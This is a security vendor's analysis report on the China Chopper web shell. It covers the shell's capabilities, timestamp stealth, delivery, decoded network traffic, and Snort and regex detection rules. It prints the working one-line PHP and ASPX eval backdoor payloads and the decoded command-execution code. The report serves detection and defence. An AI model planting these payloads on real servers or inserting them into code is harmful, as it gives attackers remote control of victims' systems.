FireEye, Inc.      The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell

Introduction

China Chopper is an increasingly popular Web shell that packs a powerful punch into a small package. 
In the space of just 4 kilobytes, the Web shell offers file and database management, code obfuscation, 
and more—all in an easy-to-use graphical user interface that even novices can use.

Given its growing prevalence, especially among Chinese cybercriminals, China Chopper warrants 
much more exposure than it has received to date. Outside of an insightful blog post from security 
researcher Keith Tyler1, little useful information on China Chopper is publically available. 

To contribute something new to the public knowledge base—especially for those who happen to find 
the China Chopper server-side payload on one of their Web servers—FireEye studied the components, 
capabilities, payload attributes, and the detection rate of this 4 kilobyte menace.

This report describes the features that make China Chopper an increasingly popular tool for cyber 
attackers. And more important, the report explains how security professionals can better detect the 
Web shell through network traffic and on compromised systems.

Components

China Chopper is a simple backdoor in terms of components. It has two key components: the Web shell 
command-and-control (CnC) client binary and a text-based Web shell payload (server component). 
The text-based payload is so simple and short that an attacker could type it by hand right on the target 
server—no file transfer needed.

Web shell client
The Web shell client was originally available on www.maicaidao.com. FireEye advises against visiting 
that site now.

The client binary is packed with UPX and is 220,672 bytes in size, as shown in Figure 1.

PEiD (a free tool for detecting packers, cryptors, and compilers found in PE executable files),2 reveals 
that the unpacked client binary was written in Microsoft Visual C++ 6.0, as shown in Figure 2.

Figure 2: PEiD reveals that  
the binary was written using  
Visual C++ 6.0

Because the strings are not encoded, examining them in the unpacked binary exposes how the 
backdoor communicates. Appearing in the strings are an intriguing reference to google.com.hk using 
the Chinese (simplified) language parameter (Figure 3) and references to the text “Chopper” (Figure 4).

In action, China Chopper is a menu-driven GUI full of convenient attack and “target-management” 
features. When opened, the client displays example shell entries that point to www.maicaidao.com, 
which originally hosted components of the Web shell.

To add a target, attackers right click within the client window, select Add from the menu and enter the 
target IP address, password, and encoding as shown in Figure 5.

Server-side Payload Component
But the client is only half of the remote access tool (RAT)—and not likely the part that would appear on 
a targeted network. Its communication relies on a payload in the form of a small Web application. This 
payload is available in a variety of languages such as ASP, ASPX, PHP, JSP, and CFM. Table 2 shows some 
of the original files available for download shown with their MD5 hashes.

Even though the MD5s are useful, this is a text-based payload that can be easily changed, resulting  
in a new MD5 hash. Here is an example of just one of China Chopper’s text-based payloads (for more 
details, see “Payload Attributes” on Page 11):

ASPX:

<%@ Page Language=”Jscript”%><%eval(Request.Item[“password”],”unsafe”);%> 

In real-world use, “password” would be replaced with the actual password to be used in the client 
component when connecting to the Web shell.

Capabilities

The capabilities of both the payload and the client are impressive considering their size. The Web shell 
client contains a “Security Scan” feature, independent of the payload, that gives the attacker the 
ability to spider and use brute-force password guessing against authentication portals.

Figure 6: China Chopper provides  
a “Security Scan” feature

In addition to vulnerability hunting, China Chopper has excellent CnC features when combining  
the client and payload, include the following:

•  File Management (File explorer)

•  Database Management (DB client)

•  Virtual Terminal (Command shell)

In China Chopper’s main window, right-clicking one of the target URLs brings up a list of possible  
actions (see Figure 7).

showing capabilities of the Web shell

File Management
Used as a RAT, China Chopper makes file management simple. Abilities include uploading and 
downloading files to and from the target, using the file-retrieval tool Wget4 to download files from the 
Web to the target. Attackers can also edit, delete, copy, and rename files—and even change their 
time stamp.

Figure 8: File management provides an 
easy-to-use menu that is activated by 
right-clicking on a file name

The Modify the file time option is a surprisingly effective stealth technique. Figure 9 shows the time 
stamps of the three files in the test directory before the Web shell modifies the time stamps. By default, 
Windows Explorer shows only the “Date Modified” field. Without the time stamp change, the Web shell 
easily stands out because it is newer than the other two files.

Figure 9: IIS directory showing time 
stamps prior to the time modification

4  Wget is available at http://www.gnu.org/software/wget/.

Figure 10 shows the date of the file after the Web shell modifies the time stamp. The “Date Modified” 
value on the Web shell shows up as the same as the other two files. This is the default field displayed to 
users, so to the untrained eye it easily blends in—especially with many files in the directory.

Figure 10: IIS directory showing time 
stamps after the time modification

Clever investigators may think that they can spot the suspicious file due to the creation date being 
changed to the same date as the modified date. But this is not necessarily anomalous. Additionally, 
even if the file is detected, the forensic timeline is skewed because the date that the attacker planted 
the file is no longer present. Finding the real date that the file was planted requires examining the 
Master File Table (MFT). After acquiring the MFT using FTK, EnCase, or other means, FireEye recommends 
using mftdump.5 Written by FireEye researcher Mike Spohn, mftdump is a great tool for extracting and 
analyzing file metadata.

Table 3 shows the time stamps pulled from the MFT for our Web shell file before and after the time 
stamps were modified. The “fn*” fields retain their original times, so some useful information remains.

Database Management
The database management functionality is impressive and helpful to the first-time user. Upon configuring 
the client, China Chopper provides example connection syntax.

After connecting, China Chopper also provides useful SQL commands.

Figure 11: Database management 
requires simple configuration 
parameters to connect

Figure 12: China Chopper’s database 
management feature lets users interact 
with a database and even provides 
helpful prepopulated commands

Command Shell Access
Finally, China Chopper provides command shell access for OS-level interaction, further  
demonstrating its versatility.

Payload Attributes

China Chopper is stealthy due to a number of factors, including the following:

•  Size

•  Server-side content

•  Client-side content

•  AV detection rate (or lack thereof)

Size
Malicious and benign software usually suffers from the same principle: more features equals more code, 
which equals larger size. Considering how many features China Chopper offers, it is incredibly small—just 
73 bytes for the ASPX version, or 4 kilobytes on disk (see Figure 14). Compare that to other Web shells 
such as Laudanum (619 bytes) or RedTeam Pentesting (8,527 bytes). China Chopper is so small and 
simple that an attacker could conceivably type the contents of the shell by hand.

Figure 14: China Chopper 
file properties

FireEye, Inc.      The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell 

11

Server-Side Content
The server-side content could easily be overlooked among the other files associated with a vanilla  
install of a complex application. The code does not look malicious—just odd.

Figure 15: The content of the file 
seems relatively benign, especially 
if with a safe-sounding word like 
“Security” as the shell password

Below are the contents of the Web shell for two of its varieties.

ASPX:

PHP:

<%@ Page Language=”Jscript”%><%eval(RequestItem[“password”],”unsafe”);%> 

<?php @eval($_POST[‘password’]);?> 

Client-Side Content
Because all of the code is server-side language that does not generate client-side code,  
browsing to the Web shell and viewing the source as a client reveals nothing.

Figure 16: Viewing the source of the 
Web shell reveals nothing to the client

12

Anti-Virus Detection Rate
Running the Web shell through the virus-scanning website “No Virus Thanks” shows a detection rate of  
0 out of 14, indicating that most, if not all, anti-virus tools would miss the Web shell on an infected system.

engine inspections showing China 
Chopper coming up clean

The same holds true for VirusTotal. None of its 47 anti-virus engines flags China Chopper as malicious. 

Figure 18: Results of multiple AV  
engine inspections showing the  
Web shell comes up clean

Platform

China Chopper can run on any Web server capable of running JSP, ASP, ASPX, PHP, or CFM—the 
majority of Web application languages. China Chopper can also run transparently on both Windows 
and Linux. This OS and application flexibility make China Chopper an even more dangerous Web shell.

“Server-side Payload Component” on Page 5 showed China Chopper executing on a Windows 2003 IIS 
server using ASPX. Figure 19 shows it running on Linux with PHP. Here, the contents of the PHP version are 
just as minimalistic.

Figure 19: This command is all that it 
takes to run on Linux with PHP

FireEye, Inc.      The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell 

14

While the available options differ depending on what platform China Chopper is running on,  
the file management features in Linux (see Figure 20) are similar to those in Windows. 

Figure 20: File browsing on a  
target system running Linux

The database client example shown in Figure 21 is MySQL instead of MS-SQL, but it offers many  
of the same capabilities. 

The virtual terminal looks familiar (Figure 22), but uses Linux commands instead of Windows because 
they are ultimately interpreted by the underlying operating system.

target system running Linux

Delivery Mechanism

China Chopper’s delivery mechanism is flexible due to the size, format, and simplicity of the malware’s 
payload. This small, text-based payload can be delivered using any of the following mechanisms:

•  WebDAV file upload

•  JBoss jmx-console or Apache Tomcat management pages  

(For more details on this attack vector, read FireEye consultant Tony Lee’s explanation)6

•  Remote exploit with a file drop

•  Lateral propagation from other access

Traffic Analysis

After examining the server-side payload and the client used to control the Web shell, the next step  
to understanding China Chopper is observing its traffic. Having both the server and client components 
enables researchers to start a packet capture to view the contents of typical traffic. As shown in  
Figure 23, the client initiates the connection over TCP port 80 using the HTTP POST method.

Figure 23: A packet capture shows that 
the Web shell traffic is HTTP POST traffic 
over TCP port 80

Because this is TCP traffic, researchers can “follow the TCP” stream in Wireshark, a popular open-source 
network-protocol analyzer that works in Unix and Windows.7 In Figure 24, the traffic in red at the top is 
from the attacker (Web client). The traffic shown in blue at the bottom is the response from the target 
(Web shell). 

Figure 24: After following the TCP 
stream, researchers can see that  
the majority of the attacker traffic  
is Base64 encoded

17

As highlighted above, the majority of the attacker traffic appears to be Base64 encoded. This is not a 
problem though, because it can be easily decoded. Using the “TextWizard” feature of the free Fiddler 
Web debugger reveals what the attacker is sending.8

(Note: %3D is a URL-encoded representation of the equal sign (“=”). Fiddler needs this to be converted 
to an equal sign for proper decoding.)

As shown In Figure 25, the Fiddler Web debugger text wizard easily converts the raw traffic from  
Base64 to plain text. 

8  Fiddler is available at http://fiddler2.com/.

Figure 25: Fiddler Web debugger 
decodes the Base64 traffic

FireEye, Inc.      The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell

Decoded traffic:

varc=newSystem.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEn-
coding(65001).
GetString(System.Convert.FromBase64String(Request.Item[“z1”])));
vare=newSystem.Diagnostics.Process();
varout:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;c.RedirectStandardError=true;
e.StartInfo=c;c.Arguments=”/c”+System.Text.Encoding.GetEncoding(65001).
GetString(System.Convert.FromBase64String(Request.Item[“z2”]));
e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();
Response.Write(out.ReadToEnd()+EI.ReadToEnd());

The decoded traffic presents something more readable. But the Base64-decoded traffic shows an 
attempt to decode more Base64 traffic stored as “z1” and “z2.” The attacker traffic shows z1 and z2 
parameters immediately after the end of the “Password” parameter.

The Base64-encoded parameters z1 and z2 are highlighted in the following output:

&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZ
jZCZlY2hvIFtFXQ%3D%3D

Base64-decoded parameters z1 and z2: 

z1=cmdz2=cd /d “c:\inetpub\wwwroot\”&whoami&echo [S]&cd&echo [E]

This code explains how the client communicates with the shell. The “Password” parameter passes the 
code to the payload to be executed. The z1 is cmd, and z2 contains the arguments to the command 
prompt sent via cmd /c. All output is sent to standard output (stdout) back to the attacker, which 
creates the following response to the whoami command and the present working directory: 

->|nt authority\network service[S]C:\Inetpub\wwwroot[E]|<-

Detection

Understanding the contents of China Chopper and what its traffic looks like allows researchers  
to detect this pest both at the network and the host level.

Network
With a standard Snort9 IDS in place, this traffic can be caught with relative ease. Keith Tyler provides  
the following basic IDS signature in his previously cited China Chopper blog post:10

alert tcp any any -> any 80 ( sid:900001; content:”base64_decode”;
http_client_body;flow:to_server,established; content:”POST”; nocase;
http_method; ;msg:”Webshell Detected Apache”;)

To reduce false positives, tighten the Snort IDS signature to focus on China Chopper by looking  
for contents of “FromBase64String” and “z1” as follows:

alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS 
(msg: “China Chopper with first Command Detected”;
flow:to_server,established; content: “FromBase64String”;
content: “z1”; content:”POST”; nocase;http_method;
reference:url,http://www.fireeye.com/blog/technical/botnet-activities-
research/2013/08/
breaking-down-the-china-chopper-web-shell-part-i.html;
classtype:web-application-attack; sid: 900000101;)

The following IDS signature looks for content of “FromBase64String” and any combination of “z” followed 
by one to three digits—it would find “z1”, “z10”, or “z100” for example. The idea: if the first command (z1) 
is missed, the signature still catches subsequent commands.

alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS 
(msg: “China Chopper with all Commands Detected”; flow:to_
server,established;
content: “FromBase64String”; content: “z”; pcre: “/Z\d{1,3}/i”; 
content:”POST”; nocase;http_method;
reference:url,http://www.fireeye.com/blog/technical/botnet-activities-
research/2013/08/
breaking-down-the-china-chopper-web-shell-part-i.html;
classtype:web-application-attack; sid: 900000102;)

Both of these IDS signatures can be optimized further to factor depth and offset. Be sure to put a valid 
SID in before implementing and test the signature for performance.

Host
Because the shells must contain a predictable syntax, researchers can quickly attempt to find files that 
have that code in play.

Many methods can be used to find files that contain China Chopper. The quickest and easiest method, 
especially on a Linux machine, is probably using regular expressions. As shown in Figure 26, a quick 
egrep across the Web directory can help identify infected files.

egrep -re ‘ [<][?]php\s\@eval[(]\$_POST\[.+\][)];[?][>]’ *.php

Figure 26: Using egrep to find  
China Chopper

As shown in Figure 26, the egrep and regex commands are a powerful combination. While the regex 
syntax may seem like gibberish, mastering it is not as difficult as it seems at first glance. Ian Ahl has 
created a few tutorials that can help improve researchers’ regex skills. Here are two to get started:

•  Regex basics (http://www.tekdefense.com/news/2012/10/21/tektip-ep12-regex-basics.html)

•  Using regex with Notepad 

(http://www.tekdefense.com/news/2013/1/6/tektip-ep19-using-regex-with-notepad.html)

Windows also provides a way to search files using regular expressions with its native findstr command.

c:\Tools>findstr /R “[<][?]php.\@eval[(]\$_POST.*[)];[?][>]” *.php
test.php:<?php @eval($_POST[‘password’]);?>
c:\Tools>–

Figure 27: Using findstr to locate  
China Chopper

FireEye, Inc.      The Little Malware That Could: Detecting and Defeating the China Chopper Web Shell 

21

The command string differs from the regex equivalent. This was necessary to get around some  
of the ways that findstr interprets regex. 

The findstr command runs as follows:

findstr /R “[<][?]php.\@eval[(]\$_POST.*[)];[?][>]” *.php

These examples show detection in the PHP shell. To find the ASPX shell, modify the regex to fit  
the syntax of the ASPX shell as shown:

egrep -re ‘[<]\%\@\sPage\sLanguage=.Jscript.\%[>][<]\%eval.Request\.
Item.+unsafe’ *.aspx
findstr /R “[<]\%\@.Page.Language=.Jscript.\%[>][<]\%eval.Request\.
Item.*unsafe” *.aspx

Researchers unsure where all of the PHP or ASPX files are on a Windows host can use the dir command 
with some extended options to help identify Web files to run the regex command against (see Figure 28).

dir /S /A /B *.php

Figure 28: Recursive search through 
Windows using the dir command

Findstr also has an option to search all subdirectories (see Figure 29), as follows:

findstr /R /S “[<][?]php.\@eval[(]\$_POST.*[)];[?][>]” *.php

locate multiple instances of the

Conclusion

Armed with knowledge about China Chopper’s features, platform versatility, delivery mechanisms, 
traffic analysis, and detection—along with a few free software tools—researchers can begin eradicating 
this elegantly designed but dangerous menace.
